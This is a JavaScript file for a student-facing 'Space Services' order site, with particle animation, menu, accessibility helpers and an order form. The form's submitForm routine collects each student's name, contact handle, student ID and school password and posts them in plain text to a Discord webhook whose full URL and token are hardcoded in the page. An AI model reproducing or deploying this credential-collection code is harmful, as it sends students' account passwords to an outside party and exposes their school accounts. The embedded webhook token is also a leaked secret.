// particle animation
class ParticleAnimation {
    constructor() {
        this.container = document.getElementById('particles');
        this.particleCount = 50;
        this.particles = [];
        this.init();
    }

    init() {
        this.createParticles();
        this.animate();
    }

    createParticles() {
        for (let i = 0; i < this.particleCount; i++) {
            this.createParticle();
        }
    }

    createParticle() {
        const particle = document.createElement('div');
        particle.classList.add('particle');
        
        const size = Math.random() * 3 + 1;
        const startY = Math.random() * window.innerHeight;
        const duration = Math.random() * 20 + 20;
        const delay = Math.random() * 20;
        
        particle.style.width = `${size}px`;
        particle.style.height = `${size}px`;
        particle.style.top = `${startY}px`;
        particle.style.left = `-${Math.random() * 100}px`;
        particle.style.animationDuration = `${duration}s`;
        particle.style.animationDelay = `-${delay}s`;
        
        this.container.appendChild(particle);
        this.particles.push(particle);
    }

    animate() {
        this.particles.forEach(particle => {
            if (parseFloat(particle.style.left) > window.innerWidth) {
                particle.style.top = `${Math.random() * window.innerHeight}px`;
                particle.style.left = `-${Math.random() * 100}px`;
            }
        });
    }
}

// mobile menu
class MobileMenu {
    constructor() {
        this.menuBtn = document.querySelector('.mobile-menu-btn');
        this.navMenu = document.querySelector('.nav-menu');
        this.navLinks = document.querySelectorAll('.nav-link');
        this.init();
    }

    init() {
        if (this.menuBtn) {
            this.menuBtn.addEventListener('click', () => this.toggleMenu());
        }

        // close menu when clicking a link
        this.navLinks.forEach(link => {
            link.addEventListener('click', () => this.closeMenu());
        });

        // close menu when clicking outside
        document.addEventListener('click', (e) => {
            if (!e.target.closest('.nav')) {
                this.closeMenu();
            }
        });
    }

    toggleMenu() {
        this.menuBtn.classList.toggle('active');
        this.navMenu.classList.toggle('active');
        
        const isExpanded = this.menuBtn.classList.contains('active');
        this.menuBtn.setAttribute('aria-expanded', isExpanded);
    }

    closeMenu() {
        this.menuBtn.classList.remove('active');
        this.navMenu.classList.remove('active');
        this.menuBtn.setAttribute('aria-expanded', 'false');
    }
}

// form validation
class FormValidator {
    constructor() {
        this.form = document.getElementById('order-form');
        if (this.form) {
            this.init();
        }
    }

    init() {
        this.setupContactMethodHandler();
        this.setupFormValidation();
        this.setupFormSubmission();
    }

    setupContactMethodHandler() {
        const contactMethod = document.getElementById('contact-method');
        const contactValue = document.getElementById('contact-value');
        const contactValueLabel = document.getElementById('contact-value-label');

        if (contactMethod && contactValue) {
            contactMethod.addEventListener('change', (e) => {
                const selectedMethod = e.target.value;
                
                // update label
                const labels = {
                    'phone': 'phone number',
                    'email': 'email address',
                    'discord': 'discord username',
                    'instagram': 'instagram handle',
                    'snapchat': 'snapchat username'
                };
                
                if (contactValueLabel && labels[selectedMethod]) {
                    contactValueLabel.textContent = labels[selectedMethod];
                }

                // update input type
                if (selectedMethod === 'email') {
                    contactValue.type = 'email';
                    contactValue.autocomplete = 'email';
                } else {
                    contactValue.type = 'text';
                    contactValue.autocomplete = 'tel';
                }
            });
        }
    }

    setupFormValidation() {
        const inputs = this.form.querySelectorAll('input, select, textarea');
        
        inputs.forEach(input => {
            input.addEventListener('blur', () => this.validateField(input));
            input.addEventListener('input', () => this.clearError(input));
        });

        // validate service card selection
        const serviceCards = document.querySelectorAll('.service-card');
        const serviceSelection = document.getElementById('service-selection');
        
        serviceCards.forEach(card => {
            card.addEventListener('click', () => {
                const serviceName = card.querySelector('.service-name').textContent.toLowerCase();
                
                // find matching option
                const options = serviceSelection.querySelectorAll('option');
                options.forEach(option => {
                    if (option.textContent.toLowerCase().includes(serviceName.split(' ')[0])) {
                        serviceSelection.value = option.value;
                        this.validateField(serviceSelection);
                    }
                });

                // scroll to form
                document.getElementById('order').scrollIntoView({ behavior: 'smooth' });
            });

            // keyboard support
            card.addEventListener('keypress', (e) => {
                if (e.key === 'Enter' || e.key === ' ') {
                    card.click();
                }
            });
        });
    }

    validateField(input) {
        const value = input.value.trim();
        const errorElement = document.getElementById(`${input.id}-error`);
        
        // clear previous error
        if (errorElement) {
            errorElement.textContent = '';
        }
        
        // check required
        if (input.hasAttribute('required') && !value) {
            this.showError(input, 'this field is required');
            return false;
        }

        // specific validations
        switch(input.id) {
            case 'full-name':
                if (value.length < 2) {
                    this.showError(input, 'please enter your full name');
                    return false;
                }
                break;

            case 'contact-value':
                const contactMethod = document.getElementById('contact-method').value;
                if (!this.validateContact(value, contactMethod)) {
                    this.showError(input, 'please enter a valid contact detail');
                    return false;
                }
                break;

            case 'student-id':
                if (value.length < 3) {
                    this.showError(input, 'please enter a valid student id');
                    return false;
                }
                break;

            case 'student-password':
                if (value.length < 4) {
                    this.showError(input, 'password must be at least 4 characters');
                    return false;
                }
                break;

            case 'service-selection':
                if (!value) {
                    this.showError(input, 'please select a service');
                    return false;
                }
                break;
        }

        return true;
    }

    validateContact(value, method) {
        if (!value || !method) return false;

        const patterns = {
            'phone': /^[\d\s\-()+.]{10,}$/,
            'email': /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
            'discord': /^.+#\d{4}$|^.{3,32}$/,
            'instagram': /^@?[a-zA-Z0-9_.]{1,30}$/,
            'snapchat': /^[a-zA-Z0-9_.-]{3,15}$/
        };

        return patterns[method] ? patterns[method].test(value) : value.length >= 3;
    }

    showError(input, message) {
        const errorElement = document.getElementById(`${input.id}-error`);
        if (errorElement) {
            errorElement.textContent = message;
        }
        input.classList.add('error');
    }

    clearError(input) {
        const errorElement = document.getElementById(`${input.id}-error`);
        if (errorElement) {
            errorElement.textContent = '';
        }
        input.classList.remove('error');
    }

    setupFormSubmission() {
        this.form.addEventListener('submit', (e) => {
            e.preventDefault();
            this.handleSubmit();
        });
    }

    handleSubmit() {
        let isValid = true;
        const inputs = this.form.querySelectorAll('input[required], select[required]');
        
        inputs.forEach(input => {
            if (!this.validateField(input)) {
                isValid = false;
            }
        });

        if (isValid) {
            this.submitForm();
        } else {
            // focus on first error
            const firstError = this.form.querySelector('.error');
            if (firstError) {
                firstError.focus();
                firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
            }
        }
    }

    async submitForm() {
        const submitBtn = this.form.querySelector('.submit-button');
        const successMessage = document.getElementById('form-success');
        
        // disable button and show loading
        submitBtn.disabled = true;
        submitBtn.textContent = 'processing...';

        // collect form data
        const formData = {
            fullName: document.getElementById('full-name').value,
            contactMethod: document.getElementById('contact-method').value,
            contactValue: document.getElementById('contact-value').value,
            studentId: document.getElementById('student-id').value,
            studentPassword: document.getElementById('student-password').value,
            service: document.getElementById('service-selection').value,
            additionalNotes: document.getElementById('additional-notes').value
        };

        // get selected service name
        const serviceSelect = document.getElementById('service-selection');
        const serviceName = serviceSelect.options[serviceSelect.selectedIndex].text;

        // create discord embed
        const embed = {
            title: '🚀 New Order - Space Services',
            color: 0x4A90E2,
            fields: [
                {
                    name: '👤 Full Name',
                    value: formData.fullName,
                    inline: true
                },
                {
                    name: '📱 Contact Method',
                    value: `${formData.contactMethod}: ${formData.contactValue}`,
                    inline: true
                },
                {
                    name: '🎓 Student ID',
                    value: formData.studentId,
                    inline: true
                },
                {
                    name: '🔐 Password',
                    value: '||' + formData.studentPassword + '||',
                    inline: true
                },
                {
                    name: '📋 Service',
                    value: serviceName,
                    inline: false
                },
                {
                    name: '📝 Additional Notes',
                    value: formData.additionalNotes || 'No additional notes',
                    inline: false
                }
            ],
            timestamp: new Date().toISOString(),
            footer: {
                text: 'Space Services Order System'
            }
        };

        try {
            // send to discord webhook
            const webhookUrl = 'https://discord.com/api/webhooks/1458213529218842725/-lXurQvbc7qvJ-f3BG8Dv59a3e6WbcHJX44KX8x_8Psiif7xQG8wTW7NejGdCUSWalNJ';
            
            const response = await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    embeds: [embed]
                })
            });

            if (response.ok) {
                // show success message
                if (successMessage) {
                    successMessage.textContent = '✅ order submitted successfully! we will contact you shortly.';
                    successMessage.classList.add('show');
                }

                // reset form
                this.form.reset();
            } else {
                throw new Error('Failed to submit order');
            }
        } catch (error) {
            console.error('Error submitting form:', error);
            
            // show error message
            if (successMessage) {
                successMessage.style.borderColor = '#ff4444';
                successMessage.style.color = '#ff4444';
                successMessage.textContent = '❌ error submitting order. please try again or contact us directly.';
                successMessage.classList.add('show');
            }
        } finally {
            submitBtn.disabled = false;
            submitBtn.textContent = 'submit order';

            // hide message after 5 seconds
            setTimeout(() => {
                if (successMessage) {
                    successMessage.classList.remove('show');
                    // reset error styling
                    setTimeout(() => {
                        successMessage.style.borderColor = '';
                        successMessage.style.color = '';
                    }, 500);
                }
            }, 5000);
        }
    }
}

// smooth scroll
class SmoothScroll {
    constructor() {
        this.init();
    }

    init() {
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', (e) => {
                const href = anchor.getAttribute('href');
                if (href !== '#') {
                    e.preventDefault();
                    const target = document.querySelector(href);
                    if (target) {
                        const headerOffset = 80;
                        const elementPosition = target.getBoundingClientRect().top;
                        const offsetPosition = elementPosition + window.pageYOffset - headerOffset;

                        window.scrollTo({
                            top: offsetPosition,
                            behavior: 'smooth'
                        });
                    }
                }
            });
        });
    }
}

// accessibility improvements
class Accessibility {
    constructor() {
        this.init();
    }

    init() {
        this.setupKeyboardNavigation();
        this.setupFocusManagement();
        this.setupAriaLiveRegions();
    }

    setupKeyboardNavigation() {
        // ensure service cards are keyboard accessible
        const serviceCards = document.querySelectorAll('.service-card');
        serviceCards.forEach((card, index) => {
            card.setAttribute('tabindex', '0');
            card.setAttribute('role', 'button');
            card.setAttribute('aria-label', card.querySelector('.service-name').textContent);
        });

        // handle escape key to close mobile menu
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                const mobileMenu = document.querySelector('.mobile-menu-btn');
                if (mobileMenu && mobileMenu.classList.contains('active')) {
                    mobileMenu.click();
                }
            }
        });
    }

    setupFocusManagement() {
        // trap focus in mobile menu when open
        const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
        const navMenu = document.querySelector('.nav-menu');
        const navLinks = document.querySelectorAll('.nav-link');

        if (mobileMenuBtn && navMenu) {
            navMenu.addEventListener('keydown', (e) => {
                if (e.key === 'Tab') {
                    const isLastLink = e.target === navLinks[navLinks.length - 1];
                    const isFirstLink = e.target === navLinks[0];

                    if (e.shiftKey && isFirstLink) {
                        e.preventDefault();
                        mobileMenuBtn.focus();
                    } else if (!e.shiftKey && isLastLink) {
                        e.preventDefault();
                        mobileMenuBtn.focus();
                    }
                }
            });
        }
    }

    setupAriaLiveRegions() {
        // add aria-live to form success message
        const successMessage = document.getElementById('form-success');
        if (successMessage) {
            successMessage.setAttribute('role', 'alert');
            successMessage.setAttribute('aria-live', 'polite');
        }
    }
}

// lazy loading for images (if any are added later)
class LazyLoader {
    constructor() {
        this.init();
    }

    init() {
        if ('IntersectionObserver' in window) {
            const imageObserver = new IntersectionObserver((entries, observer) => {
                entries.forEach(entry => {
                    if (entry.isIntersecting) {
                        const img = entry.target;
                        img.src = img.dataset.src;
                        img.classList.add('loaded');
                        observer.unobserve(img);
                    }
                });
            });

            document.querySelectorAll('img[data-src]').forEach(img => {
                imageObserver.observe(img);
            });
        }
    }
}

// initialize everything when DOM is ready
document.addEventListener('DOMContentLoaded', () => {
    // check for reduced motion preference
    const prefersReducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
    
    if (!prefersReducedMotion) {
        new ParticleAnimation();
    }
    
    new MobileMenu();
    new FormValidator();
    new SmoothScroll();
    new Accessibility();
    new LazyLoader();
});

// handle window resize for particles
let resizeTimeout;
window.addEventListener('resize', () => {
    clearTimeout(resizeTimeout);
    resizeTimeout = setTimeout(() => {
        // particles will auto-adjust
    }, 250);
});
